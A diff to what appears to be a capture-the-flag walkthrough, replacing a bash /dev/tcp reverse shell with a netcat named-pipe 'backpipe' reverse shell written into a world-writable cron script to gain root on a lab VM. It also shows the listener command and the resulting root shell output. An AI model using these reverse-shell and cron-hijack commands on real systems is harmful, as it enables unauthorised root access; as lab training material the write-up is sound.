@@ -1245,28 +1245,59 @@ Because this file is world writable all we need to do append a command to the en
 
 While my imagination runs wild with the possibilities, I'll just append a bash reverse shell and wait 5 min.
 
+lets make a reverse shell with msfvenom and create a simple web server for transfer.
+
+I tried a few different variants of shells, from bash to py and to msfvenom payloads but was met with no success. It is difficult to debug this, as we are executing blind and cannot see what is happening in the excution flow.
+
+on a scrape for tools to help I considered nc and telnet backpiping as the execute flag returned this error:
+
 ```
-echo "bash -i >& /dev/tcp/192.168.56.1/8080 0>&1" >> /usr/local/sbin/cron-logrotate.sh
-# check it worked
-cat /usr/local/sbin/cron-logrotate.sh         
-```
-Gives
-```
-#Simon, you really need to-do something about this
-bash -i >& /dev/tcp/192.168.56.1/8080 0>&1
+nc: invalid option -- 'e'
 ```
 
-> can run it to double check: . /usr/local/sbin/cron-logrotate.sh 
+To 'backpipe' a connection we need to make a device node to act as our conduit for the connection.
+We then create a network relay to the attacker machine with all of the outputs directed to the device node file. Finally we pipe all of the contents as they are written to the backpipe to a shell, in turn granting code execution  
+
+Fairly standard backpipe shell command looks like this:
+
+``` bash
+mknod /tmp/backpipe p; nc 192.168.56.1 1337 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe
+
+```
+
+make a a FIFO (p type) node called backpipe, then open nc connection to the attacker over port 1337, accepting all input from the backpipe file, pipe all stdin from /bin/bash to backpipe.
+
+This command works provided I have a shell execution (which I do), but what if I get into a situation where I lose the shell? I will want make the cron job only open the shell, not create a new node thus a reliable backpipe invocation looks something like: 
+
+``` bash
+nc 192.168.56.1 1337 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe
+```
+
+lets create the device and pipe the command into the job 
+
+``` bash
+mknod /tmp/backpipe p; echo "nc 192.168.56.1 1337 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe" > /usr/local/sbin/cron-logrotate.sh 
+```
 
 on the attacker open a listener and wait 5 min:
-```
-nc -nvlp 8080
+``` bash
+nc -nvlp 1337
 ```
 
-after a quick cup of hot beverage:
+after a quick cup of hot beverage we catch the shell and run an id:
 
 ```
-FIXME!!!
+listening on [any] 1337 ...
+connect to [192.168.56.1] from (UNKNOWN) [192.168.56.105] 50986
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+we have a root shell, lets upgrade the sh to bash:
+
+``` bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+
 ```
 
 get the flag
@@ -1291,8 +1322,6 @@ W00tW00t!
               `----------`
 b6b545dc11b7a270f4bad23432190c75162c4a2b
 ```
-
-
 
 ## Kernel Busting!
 
@@ -1631,7 +1660,3 @@ W00tW00t!
               `----------`
 b6b545dc11b7a270f4bad23432190c75162c4a2b
 ```
-
-
-
-
